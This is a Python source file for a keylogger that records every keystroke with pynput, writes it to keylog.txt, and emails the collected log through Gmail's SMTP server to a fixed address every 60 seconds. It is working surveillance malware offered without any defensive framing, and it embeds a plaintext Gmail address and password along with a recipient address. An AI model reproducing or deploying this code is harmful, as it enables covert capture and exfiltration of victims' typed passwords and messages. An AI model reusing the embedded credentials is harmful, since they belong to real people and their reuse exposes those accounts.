import logging
from pynput.keyboard import Key, Listener
import smtplib
from threading import Timer

log = ""

def setup_logger(log_dir="", log_file="keylog.txt"):
    global log
    logging.basicConfig(filename=(log_dir + log_file), level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Callback function to log keystrokes
def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == Key.space:
            log += " "
        elif key == Key.enter:
            log += "\n"
        else:
            log += f" [{str(key)}] "
    logging.info(log)  # Log to file

# Send email with the key logs
def send_email():
    global log
    if len(log) > 0:
        email_user = "sathyasurya2003@gmail.com"
        email_password = "Sid@2003"
        email_send = "e0221060@sret.edu.in"

        subject = "Keylogger Report"
        message = f"Subject: {subject}\n\n{log}"

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email_user, email_password)
            server.sendmail(email_user, email_send, message)
            server.quit()

            log = ""  # Reset the log after sending
        except Exception as e:
            logging.error(f"Error sending email: {e}")

# Timer function to send logs at intervals
def report_logs(interval=60):
    send_email()  # Send email with logs
    Timer(interval, report_logs).start()  # Schedule the next report

# Start logging keystrokes
def start_logging():
    setup_logger()
    with Listener(on_press=on_press) as listener:
        listener.join()
